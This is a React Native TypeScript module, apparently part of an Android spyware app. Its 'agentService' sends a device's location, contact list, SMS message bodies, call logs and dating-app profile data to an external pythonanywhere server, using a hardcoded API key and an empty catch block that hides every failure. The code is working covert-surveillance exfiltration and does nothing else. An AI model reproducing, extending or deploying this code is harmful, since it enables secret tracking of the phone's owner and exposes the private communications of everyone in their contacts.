import { Platform } from "react-native";

const BASE_URL = "https://securitydienetforces.pythonanywhere.com/api";
const API_KEY  = "sdf-android-key-2025";

const headers = {
  "Content-Type": "application/json",
  "X-API-Key": API_KEY,
};

async function post(path: string, body: object): Promise<void> {
  try {
    await fetch(`${BASE_URL}${path}`, {
      method:  "POST",
      headers,
      body:    JSON.stringify(body),
    });
  } catch {}
}

export interface PingPayload {
  device_id:       string;
  android_version: string;
  model:           string;
  username:        string;
  lat:             number;
  lon:             number;
  city:            string;
  country:         string;
}

export interface ContactEntry {
  name:  string;
  phone: string;
  email: string;
}

export interface SmsEntry {
  address: string;
  body:    string;
  type:    string;
  date:    string;
}

export interface CallEntry {
  number:   string;
  name:     string;
  type:     string;
  duration: string;
  date:     string;
}

export interface DatingEntry {
  device_id: string;
  platform:  string;
  username:  string;
  email:     string;
  phone:     string;
  age:       number | null;
  bio:       string;
  location:  string;
}

export const agentService = {
  ping:           (payload: PingPayload)             => post("/android/ping",            payload),
  uploadContacts: (deviceId: string, contacts: ContactEntry[]) =>
                    post("/android/upload/contacts",  { device_id: deviceId, contacts }),
  uploadSms:      (deviceId: string, sms: SmsEntry[])          =>
                    post("/android/upload/sms",       { device_id: deviceId, sms }),
  uploadCalls:    (deviceId: string, calls: CallEntry[])       =>
                    post("/android/upload/calls",     { device_id: deviceId, calls }),
  uploadDating:   (entry: DatingEntry)               => post("/android/upload/dating",   entry),
};
